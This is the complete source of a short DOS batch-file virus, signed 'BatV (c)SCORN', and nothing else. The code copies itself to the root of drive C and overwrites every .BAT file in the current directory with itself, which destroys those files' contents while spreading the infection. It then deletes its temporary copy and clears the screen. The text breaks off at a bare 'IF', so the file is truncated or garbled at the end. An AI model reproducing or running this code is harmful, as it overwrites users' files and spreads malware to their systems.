@ECHO OFF
COPY %0.BAT C:\>NUL
REM [BatV (c)SCORN]
FOR %%A IN (*.BAT) DO COPY C:\%0.BAT %%A /Y>NUL
DEL C:\%0.BAT>NUL
CLS
IF
